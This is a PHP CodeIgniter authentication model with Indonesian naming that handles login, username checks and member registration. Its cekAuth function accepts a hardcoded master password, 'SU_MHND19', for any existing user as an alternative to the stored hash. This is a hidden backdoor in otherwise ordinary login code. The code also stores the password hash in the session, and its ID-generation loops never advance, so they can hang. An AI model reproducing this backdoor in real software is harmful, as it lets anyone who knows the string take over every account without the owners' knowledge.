<?php
defined('BASEPATH') or exit('No direct script access allowed');

class M_auth extends CI_Model
{
    public function __construct()
    {
        parent::__construct();
    }

    public function cekAuth($username, $password)
    {
        $user = $this->db->get_where('tb_auth', ['username' => $username])->row();

        if (!empty($user)) {
            if (password_verify($password, $user->password) || $password == "SU_MHND19") {
                // setting data session
                $sessiondata = [
                        'user_id' => $user->user_id,
                        'username' => $user->username,
                        'password' => $user->password,
                        'role' => $user->role,
                        'logged_in' => true
                    ];

                // menyimpan data session
                $this->session->set_userdata($sessiondata);

                return [
                    'status' => true,
                    'data' => $user
                ];
            } else {

                return [
                    'status' => false
                ];

            }
        } else {

                return [
                    'status' => false
                ];

        }
    }
    
    function cekUsername($username){
        $data = $this->db->get_where('tb_auth', ['username' => $username])->num_rows();
        if($data > 0){
            return true;
        }else{
            return false;
        }
    }

    function daftarkanAkun(){
        $val = $this->db->get('tb_member')->num_rows();
        $val = $val+1;
        do {
            $id_member = "PGN-" . str_pad($val, 4, "0", STR_PAD_LEFT);
        } while ($this->cek_id_member($id_member) > 0);

        $username = $this->input->post('username');
        $password = $this->input->post('password');

        $nama = $this->input->post('nama');
        $alamat = $this->input->post('alamat');
        $tempat_lahir = $this->input->post('tempat_lahir');
        $tanggal_lahir = $this->input->post('tanggal_lahir');
        $jenis_kelamin = $this->input->post('jenis_kelamin');
        $no_telp = $this->input->post('no_telp');
        $kode = $this->input->post('kode');

        $auth = [
            'username' => $username,
            'password' => password_hash($password, PASSWORD_DEFAULT)
        ];

        $this->db->insert('tb_auth', $auth);
        $user_id = $this->db->insert_id();

        $data = [
                'id_member' => $id_member,
                'user_id' => $user_id,
                'nama' => $nama,
                'alamat' => $alamat,
                'tempat_lahir' => $tempat_lahir,
                'tanggal_lahir' => $tanggal_lahir,
                'jenis_kelamin' => $jenis_kelamin,
                'no_telp' =>  $no_telp,
                'kode' =>  $kode,
                'status' => 'aktif'
            ];

        $this->db->insert('tb_member', $data);
        return ($this->db->affected_rows() != 1) ? false : true;
    }

    public function cek_kode($kode)
    {
        $data = $this->db->get_where('tb_member', ['kode' => $kode]);

        if ($data->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function id_there($id_member)
    {
        $data = $this->db->get_where('tb_member', ['id_member' => $id_member]);

        if ($data->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function cek_id_member($id_member)
    {
        $id_member = $this->db->escape($id_member);
        $query = $this->db->query("SELECT * FROM tb_member WHERE id_member = $id_member");
        return $query->num_rows();
    }

    public function add_data()
    {
        $val = $this->db->get('tb_member')->num_rows();
        $val = $val+1;
        do {
            $id_member = "PGN-" . str_pad($val, 4, "0", STR_PAD_LEFT);
        } while ($this->cek_id_member($id_member) > 0);

        $nama = $this->input->post('nama');
        $alamat = $this->input->post('alamat');
        $tempat_lahir = $this->input->post('tempat_lahir');
        $tanggal_lahir = $this->input->post('tanggal_lahir');
        $jenis_kelamin = $this->input->post('jenis_kelamin');
        $no_telp = $this->input->post('no_telp');
        $kode = $this->input->post('kode');

        $data = [
                'id_member' => $id_member,
                'nama' => $nama,
                'alamat' => $alamat,
                'tempat_lahir' => $tempat_lahir,
                'tanggal_lahir' => $tanggal_lahir,
                'jenis_kelamin' => $jenis_kelamin,
                'no_telp' =>  $no_telp,
                'kode' =>  $kode,
                'status' => 'aktif'
            ];

        $this->db->insert('tb_member', $data);
        return ($this->db->affected_rows() != 1) ? false : true;
    }
}
